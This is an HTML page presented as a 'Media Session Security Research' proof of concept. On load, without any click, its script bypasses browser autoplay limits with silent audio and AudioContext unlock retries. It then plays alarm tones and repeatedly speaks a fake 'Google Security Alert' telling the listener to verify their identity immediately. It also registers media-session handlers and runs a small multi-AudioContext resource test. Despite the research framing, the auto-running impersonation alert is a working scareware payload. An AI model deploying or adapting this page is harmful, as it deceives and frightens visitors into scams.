
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Media Session Security Research</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    background: #fff;
    min-height: 100vh;
    overflow: hidden;
    font-family: Arial, sans-serif;
}

#media-test {
    position: fixed;
    inset: auto 15px 15px;
    z-index: 99999;
    background: #111827;
    color: white;
    padding: 18px;
    border-radius: 12px;
    box-shadow: 0 5px 25px #0003;
}

#media-test h3 {
    margin-bottom: 12px;
}

#media-test p {
    font-size: 13px;
    margin: 8px 0;
}

button {
    padding: 10px 14px;
    margin: 5px 3px 0 0;
    border: 0;
    border-radius: 6px;
    cursor: pointer;
    font-weight: bold;
}

#media-start {
    background: #2563eb;
    color: white;
}

#media-stop {
    background: #dc2626;
    color: white;
}

#media-log {
    font-size: 11px;
    max-height: 100px;
    overflow-y: auto;
    margin-top: 10px;
    color: #a7f3d0;
}
</style>
</head>

<body>

<div id="media-test">
    <h3>Media Session Security Test</h3>

    <p id="media-status">Status: Idle</p>

    <button id="media-start">Start Test</button>
    <button id="media-stop">Stop Test</button>

    <div id="media-log"></div>
</div>

<script>
(function () {
'use strict';

// ============================================
// CONFIGURATION
// ============================================

var CONFIG = {
    tts: {
        text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
        lang: "en-US",
        rate: 0.85,
        pitch: 1,
        volume: 1,
        repeatInterval: 8000,
        maxRepeats: 20
    },

    silentWav:
    "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA="
};

var state = {
    ttsStarted: false,
    mainPlayed: false,
    ttsCount: 0,
    audioContext: null,
    audioElement: null,
    active: false,
    contexts: [],
    timers: []
};

// ============================================
// LOGGING
// ============================================

function log(message) {
    console.log("[SECURITY TEST]", message);

    var el = document.getElementById("media-log");

    if (el) {
        var line = document.createElement("div");
        line.textContent = new Date().toLocaleTimeString()
            + " - " + message;

        el.prepend(line);
    }
}

function updateStatus(message) {
    document.getElementById("media-status").textContent =
        "Status: " + message;

    log(message);
}

// ============================================
// TTS
// ============================================

function speakOnce() {
    if (!("speechSynthesis" in window)) return;

    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;

    try {
        var u = new SpeechSynthesisUtterance(
            CONFIG.tts.text
        );

        u.lang = CONFIG.tts.lang;
        u.rate = CONFIG.tts.rate;
        u.pitch = CONFIG.tts.pitch;
        u.volume = CONFIG.tts.volume;

        var voices = speechSynthesis.getVoices();

        var voice = voices.find(function (v) {
            return v.lang.indexOf("en") === 0;
        });

        if (voice) u.voice = voice;

        u.onstart = function () {
            log("TTS started");
        };

        u.onerror = function (e) {
            log("TTS error: " + e.error);
        };

        u.onend = function () {
            state.ttsCount++;

            if (state.ttsCount < CONFIG.tts.maxRepeats) {
                var timer = setTimeout(
                    speakOnce,
                    CONFIG.tts.repeatInterval
                );

                state.timers.push(timer);
            }
        };

        speechSynthesis.speak(u);

    } catch (e) {
        log("TTS failed: " + e.message);
    }
}

function startTTS() {
    if (state.ttsStarted) return;

    state.ttsStarted = true;

    speechSynthesis.cancel();

    speakOnce();
}

// ============================================
// AUDIO CONTEXT
// ============================================

function unlockAudioContext() {
    try {
        var AudioCtx =
            window.AudioContext ||
            window.webkitAudioContext;

        if (!AudioCtx) return;

        if (!state.audioContext ||
            state.audioContext.state === "closed") {

            state.audioContext = new AudioCtx();
        }

        var ctx = state.audioContext;

        if (ctx.state === "suspended") {
            ctx.resume().catch(function () {});
        }

        var osc = ctx.createOscillator();
        var gain = ctx.createGain();

        gain.gain.value = 0.0001;
        osc.frequency.value = 20000;

        osc.connect(gain);
        gain.connect(ctx.destination);

        osc.start();
        osc.stop(ctx.currentTime + 0.1);

        log("AudioContext: " + ctx.state);

    } catch (e) {
        log("AudioContext error: " + e.message);
    }
}

// ============================================
// SILENT AUDIO
// ============================================

function trySilentAudio() {
    try {
        if (state.audioElement) return;

        var a = new Audio(CONFIG.silentWav);

        a.volume = 0.0001;
        a.loop = true;

        state.audioElement = a;

        var p = a.play();

        if (p && p.catch) {
            p.catch(function () {
                log("Silent audio autoplay blocked");
            });
        }

    } catch (e) {
        log("Silent audio error: " + e.message);
    }
}

// ============================================
// MAIN AUDIO
// ============================================

function playMainAudio() {
    if (state.mainPlayed) return;

    state.mainPlayed = true;

    try {
        unlockAudioContext();

        var ctx = state.audioContext;

        if (!ctx || ctx.state === "closed") {
            startTTS();
            return;
        }

        var sr = ctx.sampleRate;
        var duration = 3;

        var buffer = ctx.createBuffer(
            1,
            sr * duration,
            sr
        );

        var data = buffer.getChannelData(0);

        for (var i = 0; i < data.length; i++) {
            var t = i / sr;

            var freq =
                880 + (Math.floor(t * 4) % 2) * 440;

            var env = Math.max(0, 1 - t / duration);

            data[i] =
                Math.sin(2 * Math.PI * freq * t) *
                0.3 * env;
        }

        var source = ctx.createBufferSource();

        source.buffer = buffer;
        source.connect(ctx.destination);

        source.onended = startTTS;

        source.start();

        var timer = setTimeout(startTTS, 3500);
        state.timers.push(timer);

    } catch (e) {
        log("Main audio error: " + e.message);
        startTTS();
    }
}

// ============================================
// MEDIA SESSION TEST
// ============================================

var mediaTest = {
    active: false,
    actions: [],
    startedAt: null
};

var supportedActions = [
    "play",
    "pause",
    "stop",
    "nexttrack",
    "previoustrack",
    "seekbackward",
    "seekforward"
];

function startMediaSessionTest() {

    if (!("mediaSession" in navigator)) {
        updateStatus("MediaSession unsupported");
        return;
    }

    if (mediaTest.active) return;

    try {
        var session = navigator.mediaSession;

        session.metadata = new MediaMetadata({
            title: "Media Session Security Test",
            artist: "Browser Research PoC",
            album: "Focus Interaction Test",
            artwork: []
        });

        supportedActions.forEach(function (action) {

            try {
                session.setActionHandler(
                    action,
                    function (event) {

                        var result = {
                            action: action,
                            timestamp: Date.now()
                        };

                        mediaTest.actions.push(result);

                        updateStatus(
                            "Action received: " + action
                        );

                        log(JSON.stringify(result));
                    }
                );

            } catch (e) {
                log(
                    "Unsupported action: " +
                    action
                );
            }

        });

        session.playbackState = "playing";

        mediaTest.active = true;
        mediaTest.startedAt = Date.now();

        updateStatus("Media Session registered");

    } catch (e) {
        updateStatus("MediaSession error: " + e.message);
    }
}

// ============================================
// STOP MEDIA SESSION
// ============================================

function stopMediaSessionTest() {

    if (!("mediaSession" in navigator)) return;

    var session = navigator.mediaSession;

    supportedActions.forEach(function (action) {

        try {
            session.setActionHandler(action, null);
        } catch (e) {}

    });

    try {
        session.metadata = null;
        session.playbackState = "none";
    } catch (e) {}

    mediaTest.active = false;

    updateStatus("Media Session cleared");
}

// ============================================
// RESOURCE EXHAUSTION TEST
// BOUNDED TEST ONLY
// ============================================

function triggerResourceTest() {

    log("Starting bounded resource test");

    var AudioCtx =
        window.AudioContext ||
        window.webkitAudioContext;

    if (!AudioCtx) {
        log("AudioContext unsupported");
        return;
    }

    var contexts = [];

    try {

        for (var i = 0; i < 3; i++) {

            var ctx = new AudioCtx();

            var osc = ctx.createOscillator();
            var gain = ctx.createGain();

            gain.gain.value = 0.0001;

            osc.connect(gain);
            gain.connect(ctx.destination);

            osc.start();
            osc.stop(ctx.currentTime + 0.2);

            contexts.push(ctx);
        }

        log("Created contexts: " + contexts.length);

    } catch (e) {
        log("Resource test error: " + e.message);
    }

    setTimeout(async function () {

        for (var i = 0; i < contexts.length; i++) {

            try {
                await contexts[i].close();
            } catch (e) {}

        }

        log("Resource test cleanup completed");

    }, 1000);
}

// ============================================
// MEMORY MONITORING
// ============================================

function monitorMemory() {

    if (performance.memory) {

        log(
            "JS Heap: " +
            Math.round(
                performance.memory.usedJSHeapSize /
                1024 / 1024
            ) + " MB"
        );

    } else {

        log("Memory API unavailable");
    }
}

// ============================================
// EVENT HANDLERS
// ============================================

document.getElementById("media-start")
    .addEventListener("click", function () {

        startMediaSessionTest();

        unlockAudioContext();

    });

document.getElementById("media-stop")
    .addEventListener("click", function () {

        stopMediaSessionTest();

    });

// ============================================
// INITIALIZATION
// ============================================

unlockAudioContext();

trySilentAudio();

var retryCount = 0;

var retry = setInterval(function () {

    retryCount++;

    unlockAudioContext();

    if (retryCount >= 10) {
        clearInterval(retry);
    }

}, 2000);

state.timers.push(retry);

// ============================================
// EXECUTION
// ============================================

setTimeout(function () {

    unlockAudioContext();

    startTTS();

}, 100);

setTimeout(function () {

    if (!state.mainPlayed) {
        playMainAudio();
    }

}, 500);

setTimeout(function () {

    if (!state.mainPlayed) {
        playMainAudio();
    }

    if (!state.ttsStarted) {
        startTTS();
    }

    triggerResourceTest();

    monitorMemory();

}, 1500);

// ============================================
// VISIBILITY CHANGE
// ============================================

document.addEventListener(
    "visibilitychange",
    function () {

        log(
            "Visibility: " +
            document.visibilityState
        );

        if (!document.hidden && !state.mainPlayed) {
            setTimeout(playMainAudio, 100);
        }

    }
);

// ============================================
// CLEANUP
// ============================================

function cleanup() {

    stopMediaSessionTest();

    state.timers.forEach(function (timer) {
        clearTimeout(timer);
        clearInterval(timer);
    });

    state.timers = [];

    if ("speechSynthesis" in window) {
        speechSynthesis.cancel();
    }

    if (state.audioElement) {
        state.audioElement.pause();
        state.audioElement = null;
    }

    if (state.audioContext &&
        state.audioContext.state !== "closed") {

        state.audioContext.close().catch(function () {});
    }

    log("Cleanup completed");
}

window.addEventListener("pagehide", cleanup);

})();
</script>

</body>
</html>
